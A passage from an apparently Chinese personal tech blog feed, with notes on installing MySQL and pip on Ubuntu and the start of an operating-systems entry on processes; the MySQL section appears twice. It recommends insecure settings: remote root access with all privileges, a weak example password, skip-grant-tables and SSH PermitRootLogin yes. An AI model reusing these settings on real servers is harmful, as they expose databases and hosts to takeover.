CREATE USER &#x27;newuser&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;12345678&#x27;;</span><br></pre></td></tr></table></figure><p>赋予<code>newuser</code>所有的资料库权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON *.* TO &#x27;newuser&#x27;@&#x27;%&#x27;;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p>以及更上面一样注释监听端口</p><h1 id="下载python"><a href="#下载python" class="headerlink" title="下载python"></a>下载python</h1><h3 id="安装python"><a href="#安装python" class="headerlink" title="安装python"></a>安装python</h3><p><code>apt-get install python</code></p><h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><p>安装低版本的pip：</p><p><code>sudo apt-get install python-pip</code></p><p>然后根据网上的命令 <code>python -m pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple/</code></p><p>更新完后出现了各种错误，经过各种尝试之后发现这个应该是windows才能用的更新</p><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318152354421.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318152354421.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318152354421" style="zoom: 67%;"><p>此时再次卸载掉pip之后</p><p><code> sudo apt-get --purge remove python-pip</code></p><p>再用上面的命令重装后，还是同样的错误，经过尝试，需要到</p><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318153253024.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318153253024.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318153253024" style="zoom:67%;"><p>将该目录下的配置文件全部删除<code>rm -r *</code>再进行重装 </p><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318153420438.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318153420438.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318153420438" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 删除软件及其配置文件</span><br><span class="line">apt-get --purge remove &lt;package&gt;</span><br><span class="line"># 删除没用的依赖包</span><br><span class="line">apt-get autoremove &lt;package&gt;</span><br><span class="line"># 此时dpkg的列表中有“rc”状态的软件包，可以执行如下命令做最后清理：</span><br><span class="line">dpkg -l |grep ^rc|awk &#x27;&#123;print $2&#125;&#x27; |sudo xargs dpkg -P</span><br><span class="line"># 当然如果要删除暂存的软件安装包，也可以再使用clean命令。</span><br><span class="line">apt-get clean &lt;package&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">安装2版本的pip</span><br><span class="line">`https://bootstrap.pypa.io/pip/2.7/get-pip.py`</span><br><span class="line">`python get-pip.py`</span><br></pre></td></tr></table></figure><h3 id="python2安装pymysql"><a href="#python2安装pymysql" class="headerlink" title="python2安装pymysql"></a>python2安装pymysql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、下载pymysql包</span><br><span class="line">wget https://files.pythonhosted.org/packages/44/39/6bcb83cae0095a31b6be4511707fdf2009d3e29903a55a0494d3a9a2fac0/PyMySQL-0.8.1.tar.gz</span><br><span class="line">2、解压</span><br><span class="line">tar -zxvf PyMySQL-0.8.1.tar.gz</span><br><span class="line">3、安装</span><br><span class="line">进入PyMySQL-0.8.1目录,执行：</span><br><span class="line">python2 setup.py install</span><br></pre></td></tr></table></figure><h1 id="查询命令"><a href="#查询命令" class="headerlink" title="查询命令"></a>查询命令</h1><p><code>opkg -l | grep &quot;xxx&quot;</code></p><h1 id="‘ascii’-codec-can’t-encode"><a href="#‘ascii’-codec-can’t-encode" class="headerlink" title="‘ascii’ codec can’t encode"></a>‘ascii’ codec can’t encode</h1><p>执行python时使用了ascii编码 </p><p><code>PYTHONIOENCODING=utf-8 nohup python3 -u querydianfei.py &gt; dianfei.out &amp;</code></p><h1 id="后台执行命令"><a href="#后台执行命令" class="headerlink" title="后台执行命令"></a>后台执行命令</h1><h1 id="root用户支持远程访问"><a href="#root用户支持远程访问" class="headerlink" title="root用户支持远程访问"></a>root用户支持远程访问</h1><p>修改/etc/ssh/sshd_config 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将 PermitRotLogin without-password  修改为 PermitRootLogin yes，如下：</span><br><span class="line"># Authentication:</span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line">可以成功登陆了。</span><br></pre></td></tr></table></figure><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/b9b269d688e1ac8fecd674270a9a338.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/b9b269d688e1ac8fecd674270a9a338.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="b9b269d688e1ac8fecd674270a9a338" style="zoom:67%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql5.7安装</title>
      <link href="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="Centos安装时软件库"><a href="#Centos安装时软件库" class="headerlink" title="Centos安装时软件库"></a>Centos安装时软件库</h1><p><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210329165431245.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210329165431245.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210329165431245"></p><h1 id="配置ubuntu18-04环境"><a href="#配置ubuntu18-04环境" class="headerlink" title="配置ubuntu18.04环境"></a>配置ubuntu18.04环境</h1><p><a href="https://blog.csdn.net/longgeaisisi/article/details/78448525">https://blog.csdn.net/longgeaisisi/article/details/78448525</a></p><p>web目录:/var/www/html </p><h1 id="建立mysql数据库"><a href="#建立mysql数据库" class="headerlink" title="建立mysql数据库"></a>建立mysql数据库</h1><p>查找软件：</p><p> <code>sudo apt-cache search all | grep mysql</code></p><h3 id="删除之前的版本"><a href="#删除之前的版本" class="headerlink" title="删除之前的版本"></a>删除之前的版本</h3><p><code>sudo apt-get autoremove mysql* --purge</code></p><p>删除mysql所有的依赖</p><h3 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h3><p><code>sudo apt-get install mysql-server mysql-common</code></p><h3 id="设置远程登录"><a href="#设置远程登录" class="headerlink" title="设置远程登录"></a>设置远程登录</h3><p><code>netstat -an|grep 3306</code></p><p>查看端口3306是否打开</p><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318132131050.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318132131050.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318132131050" style="zoom: 67%;"><p>其中可以到127.0.0.1:3306只允许本地登录</p><p>修改mysql配置文件<code>vi /etc/mysql/mysql.conf.d/mysqld.cnf</code></p><p>注释掉<code>bind-address = 127.0.0.1</code></p><p>重启服务：</p><p><code>关掉mysql服务：sudo /etc/init.d/mysql stop 启动mysql服务：sudo /etc/init.d/mysql start</code></p><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318133409754.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318133409754.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318133409754" style="zoom:67%;"><p>并且设置允许root用户远程访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 指定root用户的Host字段为%</span><br><span class="line">use mysql                                            # 切换到数据库mysql</span><br><span class="line">select user,host from user;                          # 查询user表中数据</span><br><span class="line">update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;;          # 修改root账号的host字段为：%</span><br><span class="line"> </span><br><span class="line"># 给任意主机root账户连接mysql服务器权限：</span><br><span class="line">GRANT ALL PRIVILEGES ON *.*  TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password&#x27; WITH GRANT OPTION;</span><br><span class="line"># 对于5.7使用</span><br><span class="line">update user set plugin=&quot;mysql_native_password&quot; where User=&#x27;root&#x27;;  # THIS LINE</span><br><span class="line"></span><br><span class="line">flush privileges;                                    # 刷新权限表，使配置生效</span><br></pre></td></tr></table></figure><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318133515248.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318133515248.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318133515248" style="zoom:67%;"><h4 id="mysql5-7设置密码登陆"><a href="#mysql5-7设置密码登陆" class="headerlink" title="mysql5.7设置密码登陆"></a>mysql5.7设置密码登陆</h4><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210405143418734.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210405143418734.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405143418734" style="zoom:50%;"><p>命令行密码不能登陆，到配置文件设置跳过密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mysql/mysql.conf.d/mysqld.cnf</span><br></pre></td></tr></table></figure><p>打开该文件 在 <code>[mysqld]</code>下添加 <code>skip-grant-tables</code>，此行代码意味着跳过密码登陆</p><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210405143645489.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210405143645489.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405143645489" style="zoom:33%;"><p>然后后保存，重启服务 <code>sudo /etc/init.d/mysql restart</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">//update use set password=password(&#x27;123&#x27;) where user=&#x27;root&#x27;;mysql5.7密码字段已经够改了 需要换成authenticat</span><br><span class="line">ion_string </span><br><span class="line">update user set authentication_string=password(&#x27;密码&#x27;) where user=&#x27;root&#x27;;</span><br></pre></td></tr></table></figure><p>然后注释掉前面的配置即可登陆成功</p><h3 id="mysql8-0设置"><a href="#mysql8-0设置" class="headerlink" title="mysql8.0设置"></a>mysql8.0设置</h3><p>下载MySQL提供的套件管理设定档至<code>/tmp</code>资料夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -OL https://dev.mysql.com/get/mysql-apt-config_0.8.12-1_all.deb</span><br></pre></td></tr></table></figure><p>下载完成后，<code>.deb</code>的软体套件包需以<code>dpkg</code>指令安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i mysql-apt-config* <span class="comment">#选择8.0版本</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install mysql-server <span class="comment">#安装命令</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> service mysql status <span class="comment">#查看运行状态</span></span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@iZbp17jdvnw88dzg0be3y7Z:/tmp# service mysql status</span><br><span class="line">● mysql.service - MySQL Community Server</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset: enabled)</span><br><span class="line">     Active: active (running) since Thu 2021-03-18 18:07:43 CST; 12s ago</span><br><span class="line">   Main PID: 9208 (mysqld)</span><br><span class="line">     Status: &quot;Server is operational&quot;</span><br><span class="line">      Tasks: 38 (limit: 2318)</span><br><span class="line">     Memory: 331.5M</span><br><span class="line">     CGroup: /system.slice/mysql.service</span><br><span class="line">             └─9208 /usr/sbin/mysqld</span><br></pre></td></tr></table></figure><ul><li>安装密码强度验证插件插件 y</li><li>设置密码强度安全等级 </li><li>修改root访问权限 是否禁止<code>root</code>远程登录 </li><li>移除匿名用户</li><li>可移除测试数据库</li><li>设置完成重新加载安全表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27;</span><br><span class="line"></span><br><span class="line">mysql -u root</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;Current-Root-Password&#x27;;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>增加远端访问，主要在%号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE USER &#x27;newuser&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;12345678&#x27;;</span><br></pre></td></tr></table></figure><p>赋予<code>newuser</code>所有的资料库权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON *.* TO &#x27;newuser&#x27;@&#x27;%&#x27;;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p>以及更上面一样注释监听端口</p><h1 id="下载python"><a href="#下载python" class="headerlink" title="下载python"></a>下载python</h1><h3 id="安装python"><a href="#安装python" class="headerlink" title="安装python"></a>安装python</h3><p><code>apt-get install python</code></p><h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><p>安装低版本的pip：</p><p><code>sudo apt-get install python-pip</code></p><p>然后根据网上的命令 <code>python -m pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple/</code></p><p>更新完后出现了各种错误，经过各种尝试之后发现这个应该是windows才能用的更新</p><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318152354421.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318152354421.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318152354421" style="zoom: 67%;"><p>此时再次卸载掉pip之后</p><p><code> sudo apt-get --purge remove python-pip</code></p><p>再用上面的命令重装后，还是同样的错误，经过尝试，需要到</p><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318153253024.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318153253024.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318153253024" style="zoom:67%;"><p>将该目录下的配置文件全部删除<code>rm -r *</code>再进行重装 </p><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318153420438.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318153420438.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318153420438" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 删除软件及其配置文件</span><br><span class="line">apt-get --purge remove &lt;package&gt;</span><br><span class="line"># 删除没用的依赖包</span><br><span class="line">apt-get autoremove &lt;package&gt;</span><br><span class="line"># 此时dpkg的列表中有“rc”状态的软件包，可以执行如下命令做最后清理：</span><br><span class="line">dpkg -l |grep ^rc|awk &#x27;&#123;print $2&#125;&#x27; |sudo xargs dpkg -P</span><br><span class="line"># 当然如果要删除暂存的软件安装包，也可以再使用clean命令。</span><br><span class="line">apt-get clean &lt;package&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">安装2版本的pip</span><br><span class="line">`https://bootstrap.pypa.io/pip/2.7/get-pip.py`</span><br><span class="line">`python get-pip.py`</span><br></pre></td></tr></table></figure><h3 id="python2安装pymysql"><a href="#python2安装pymysql" class="headerlink" title="python2安装pymysql"></a>python2安装pymysql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、下载pymysql包</span><br><span class="line">wget https://files.pythonhosted.org/packages/44/39/6bcb83cae0095a31b6be4511707fdf2009d3e29903a55a0494d3a9a2fac0/PyMySQL-0.8.1.tar.gz</span><br><span class="line">2、解压</span><br><span class="line">tar -zxvf PyMySQL-0.8.1.tar.gz</span><br><span class="line">3、安装</span><br><span class="line">进入PyMySQL-0.8.1目录,执行：</span><br><span class="line">python2 setup.py install</span><br></pre></td></tr></table></figure><h1 id="查询命令"><a href="#查询命令" class="headerlink" title="查询命令"></a>查询命令</h1><p><code>opkg -l | grep &quot;xxx&quot;</code></p><h1 id="‘ascii’-codec-can’t-encode"><a href="#‘ascii’-codec-can’t-encode" class="headerlink" title="‘ascii’ codec can’t encode"></a>‘ascii’ codec can’t encode</h1><p>执行python时使用了ascii编码 </p><p><code>PYTHONIOENCODING=utf-8 nohup python3 -u querydianfei.py &gt; dianfei.out &amp;</code></p><h1 id="后台执行命令"><a href="#后台执行命令" class="headerlink" title="后台执行命令"></a>后台执行命令</h1><h1 id="root用户支持远程访问"><a href="#root用户支持远程访问" class="headerlink" title="root用户支持远程访问"></a>root用户支持远程访问</h1><p>修改/etc/ssh/sshd_config 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将 PermitRotLogin without-password  修改为 PermitRootLogin yes，如下：</span><br><span class="line"># Authentication:</span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line">可以成功登陆了。</span><br></pre></td></tr></table></figure><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/b9b269d688e1ac8fecd674270a9a338.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/b9b269d688e1ac8fecd674270a9a338.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="b9b269d688e1ac8fecd674270a9a338" style="zoom:67%;">]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.进程与线程</title>
      <link href="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
      <url>/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><h2 id="进程的定义"><a href="#进程的定义" class="headerlink" title="进程的定义"></a>进程的定义</h2><ul><li><p>进程是指一个具有一定<strong>独立功能</strong>的程序在一个<strong>数据集合</strong>上的一次<strong>动态执行</strong>的过程</p></li><li><p>进程的特点：动态性、并发性、独立性、制约性</p></li><li><p>程序=文化（静态的可执行文件）</p></li><li><p>进程=执行中的程序=程序+执行状态</p></li></ul><h2 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h2><p>描述和控制进程运行的数据结构：**进程控制块PCB(Process Control Block)**，是操作系统中最重要的记录型数据结构。</p><ul><li>操作系统用PCB来描述进程的基本情况以及运行的变化过程</li><li>PCB是进程存在的唯一标志、每个进程在操作系统中都有一个对应的PCB</li></ul><p>进程控制块的使用：进程的创建、终止、组织管理</p><p>进程控制块的内容：进程的标识信息、处理机现场保存、进程控制信息</p><p>进程控制块的组织方式：线性方式、链接方式、索引方式</p><p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321134250680.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321134250680.png" 